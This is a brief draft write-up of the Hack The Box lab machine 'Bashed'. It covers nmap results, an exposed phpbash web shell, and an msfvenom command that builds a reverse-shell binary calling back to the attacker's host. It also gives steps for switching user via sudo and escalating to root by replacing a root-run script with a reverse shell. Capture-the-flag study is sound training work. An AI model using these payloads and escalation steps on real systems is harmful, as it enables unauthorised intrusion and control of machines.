---
title: HTB Bashed (2026)
author: kei5uke
draft: true
description: Writeup for HTB Bashed (2026)
tags:
  - linux
  - writeup
---

# Nmap

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
```

# HTTP 80

![[HTB Bashed (2026) - image.png]]

[http://10.129.36.139/dev/phpbash.min.php](http://10.129.36.139/dev/phpbash.min.php)

- This webpage gives you a some restricted shell.
- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.252 LPORT=4444 -f elf -o reverse.elf`
- Execute this and get rev shell.
- Confirm root runs `python /scripts/test.py`
- `sudo -l` —> `sudo -u scriptmanager bash`
- Replace test.py with revshell
